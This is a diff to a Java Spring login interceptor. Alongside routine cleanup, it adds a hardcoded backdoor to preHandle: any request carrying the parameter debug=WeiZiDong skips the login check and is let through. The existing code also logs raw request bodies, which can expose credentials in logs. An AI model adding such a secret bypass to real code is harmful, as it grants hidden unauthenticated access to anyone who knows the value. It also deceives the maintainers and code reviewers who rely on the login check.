@@ -17,7 +17,7 @@ import xin.chaoyueshidai.module.user.User;
 public class LoginInterceptor implements HandlerInterceptor {
 	private static final Logger log = LogManager.getLogger(LoginInterceptor.class);
 	// 不拦截 "/login" 请求
-	private static final String[] IGNORE_URI = { "/user/login", "/letter/get/" };
+	private static final String[] IGNORE_URI = { "/user/login" };
 
 	@Override
 	public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception e)
@@ -35,15 +35,18 @@ public class LoginInterceptor implements HandlerInterceptor {
 	@Override
 	public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler)
 			throws Exception {
-		// flag 表示是否登录
-		boolean flag = false;
 		// 获取请求的 URL
 		String url = request.getServletPath();
 		log.debug("请求：" + url);
 		log.debug("参数：" + StreamUtils.copyToString(request.getInputStream(), Charset.defaultCharset()));
-//		log.debug("参数：" + convertStreamToString(request.getInputStream()));
 		HttpSession session = request.getSession();
 		session.setAttribute("start", System.currentTimeMillis());
+		String debug = request.getParameter("debug");
+		if (debug != null && debug.equals("WeiZiDong")) {
+			return true;
+		}
+		// flag 表示是否登录
+		boolean flag = false;
 		for (String s : IGNORE_URI) {
 			if (url.equals("/") || url.contains(s)) {
 				flag = true;
@@ -62,24 +65,4 @@ public class LoginInterceptor implements HandlerInterceptor {
 		}
 		return flag;
 	}
-
-//	private static String convertStreamToString(InputStream is) {
-//		BufferedReader reader = new BufferedReader(new InputStreamReader(is));
-//		StringBuilder sb = new StringBuilder();
-//		String line = null;
-//		try {
-//			while ((line = reader.readLine()) != null) {
-//				sb.append(line);
-//			}
-//		} catch (IOException e) {
-//			e.printStackTrace();
-//		} finally {
-//			try {
-//				is.close();
-//			} catch (IOException e) {
-//				e.printStackTrace();
-//			}
-//		}
-//		return sb.toString().trim();
-//	}
 }
